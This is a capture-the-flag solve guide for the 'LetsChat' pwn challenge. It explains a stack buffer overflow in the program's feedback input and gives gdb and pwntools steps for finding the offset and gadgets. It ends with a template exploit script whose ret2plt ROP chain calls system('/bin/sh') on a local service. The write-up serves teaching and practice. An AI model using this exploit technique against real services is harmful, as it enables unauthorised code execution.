# Solve.md

# [Difficulty] Pwn - LetsChat - Solve Guide

## Overview

The challenge provides a compiled binary that simulates a chat application.

The user can create a user, send a message to that user, and leave a rating or feedback for the app.

The vulnerability is in the feedback input. The program accepts more data than the feedback buffer can safely store, causing a stack-based buffer overflow.

By overflowing the buffer, the return address can be overwritten and a ROP chain can be used to call `system("/bin/sh")`.

## Initial Analysis

Start by running the binary through the provided Docker setup:
```
docker build -t letschat .
docker run --rm -it -p 1337:1337 letschat
```
Connect to the service:
```
nc 127.0.0.1 1337
```
Interact with the menu and identify the available options.

The application behaves like a simple chat app, but the important functionality is the feedback or rating option.

## Vulnerability

The feedback input is vulnerable to a buffer overflow.

The program reads user-controlled feedback into a fixed-size stack buffer without safely enforcing the input length.

Supplying an oversized input overwrites saved stack data, including the saved return address.

This allows control of execution flow.

## Exploitation Strategy

The goal is to call:
```
system("/bin/sh")
```
Useful information:

- `system()` is available through the PLT.
- The string `/bin/sh` is stored somewhere inside the binary.
- A ROP chain can be used to call `system()` with `/bin/sh` as the first argument.

On x86_64 Linux, the first function argument is passed in the `RDI` register, so the exploit needs a gadget such as:
```
pop rdi; ret
```
The ROP chain should look like:
```
padding
pop rdi; ret
address_of_bin_sh
system_plt
```
Depending on stack alignment, an extra `ret` gadget may be required before calling `system()`.

## Finding the Offset

Use a cyclic pattern to identify the exact offset to the saved return address.

Example with pwntools:
```python
from pwn import *

payload = cyclic(300)
print(payload)
```
Send this payload into the vulnerable feedback field, then inspect the crash in `gdb` to find the overwritten instruction pointer.

Example:
```bash
gdb ./letschat
run
```
After the crash:
```
info registers
```
Then calculate the offset:
```python
from pwn import *

offset = cyclic_find(0x6161616b)
print(offset)
```
Replace the example value with the actual overwritten value from the crash.

## Finding Useful Addresses

Use tools such as `checksec`, `ROPgadget`, `objdump`, `readelf`, or pwntools.

Check binary protections:
```
checksec --file=./letschat
```
Find the `system()` PLT address:
```
objdump -d ./letschat | grep system
```
Find the `/bin/sh` string:
```
strings -a -t x ./letschat | grep "/bin/sh"
```
Find a `pop rdi; ret` gadget:
```
ROPgadget --binary ./letschat | grep "pop rdi"
```
## Example Exploit Structure

The exact addresses and offset will depend on the compiled binary, so replace the placeholder values below with the values found during analysis.
```python
from pwn import *

binary = ELF("./letschat")

HOST = "127.0.0.1"
PORT = 1337

offset = 0  # replace with cyclic offset

pop_rdi = 0x0      # replace with pop rdi; ret gadget
ret = 0x0          # optional stack alignment gadget
system_plt = binary.plt["system"]
bin_sh = next(binary.search(b"/bin/sh"))

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_plt)

# If the exploit crashes due to stack alignment, use:
# payload = b"A" * offset
# payload += p64(ret)
# payload += p64(pop_rdi)
# payload += p64(bin_sh)
# payload += p64(system_plt)

io = remote(HOST, PORT)

# Navigate the menu here.
# The exact sendlineafter prompts should be updated based on the binary output.

io.sendlineafter(b">", b"3")
io.sendlineafter(b"feedback:", payload)

io.interactive()
```
## Exploit Flow

1. Start the challenge service.
2. Connect with netcat or a pwntools script.
3. Navigate to the feedback or rating option.
4. Send an oversized payload.
5. Confirm control of the return address.
6. Locate `system()` in the PLT.
7. Locate the `/bin/sh` string inside the binary.
8. Build a ROP chain to call `system("/bin/sh")`.
9. Send the final payload and catch the shell.

## Key Finding

The vulnerable feedback input allows a stack-based buffer overflow.

Because `system()` and `/bin/sh` are already present in the binary, the exploit does not need shellcode. A ret2plt / ROP chain is sufficient.

## Flag
```
P2P{REDACTED}
```
## Lessons Learned

This challenge demonstrates a classic stack buffer overflow leading to control of the saved return address.

The important exploitation concepts are:

- Identifying unsafe input handling
- Finding the overflow offset
- Locating useful PLT functions
- Finding strings inside the binary
- Building a ROP chain
- Passing function arguments using the correct calling convention
- Spawning a shell with `system("/bin/sh")`